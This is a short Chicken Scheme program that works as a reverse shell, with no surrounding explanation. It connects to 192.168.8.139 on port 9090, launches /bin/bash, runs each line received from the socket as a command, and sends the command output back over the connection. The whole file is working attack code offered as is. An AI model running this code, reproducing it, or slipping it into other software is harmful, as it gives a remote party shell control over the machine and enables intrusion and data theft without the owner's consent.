(import (chicken tcp) (chicken io) (chicken process))
(define-values (sr sw) (tcp-connect "192.168.8.139" 9090))
(define-values (pr pw ps) (process "/bin/bash"))

(define (lines)
  (let ((x (read-line pr)))
    (if (not (equal? x "[ENDEND]"))
      (begin
        (print x)
        (write-line x sw)
        (lines)))))

(define (loop)
(write-line (string-append (read-line sr) "; echo '[ENDEND]'") pw)
(lines)
(loop))

(loop)
